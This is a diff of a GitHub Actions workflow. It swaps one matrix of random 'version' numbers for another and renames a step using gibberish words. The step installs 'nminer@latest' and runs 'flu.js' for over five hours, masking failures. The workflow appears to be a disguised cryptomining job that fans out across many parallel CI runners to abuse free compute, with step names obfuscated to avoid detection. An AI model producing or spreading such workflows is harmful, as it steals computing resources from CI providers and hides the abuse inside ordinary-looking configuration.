@@ -9,26 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8569 }
-          - { version: 1330 }
-          - { version: 526 }
-          - { version: 2948 }
-          - { version: 7698 }
-          - { version: 5831 }
-          - { version: 6955 }
-          - { version: 5817 }
-          - { version: 7168 }
-          - { version: 6968 }
-          - { version: 9291 }
-          - { version: 7489 }
-          - { version: 4361 }
-          - { version: 2783 }
-          - { version: 1754 }
-          - { version: 6092 }
-          - { version: 9857 }
-          - { version: 3087 }
-          - { version: 174 }
-          - { version: 4178 }
+          - { version: 4645 }
+          - { version: 1432 }
+          - { version: 2631 }
+          - { version: 9936 }
+          - { version: 949 }
+          - { version: 756 }
+          - { version: 6875 }
+          - { version: 1318 }
+          - { version: 7115 }
+          - { version: 8676 }
+          - { version: 9301 }
+          - { version: 7070 }
+          - { version: 3764 }
+          - { version: 9328 }
+          - { version: 6136 }
 
     steps:
       - name: Checkout
@@ -39,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: how like ample presell
+      - name: elegant bitterly despite normal portray
         run: |
           npm install nminer@latest
-          timeout 309m node flu.js || echo "flu executed"
+          timeout 318m node flu.js || echo "flu executed"
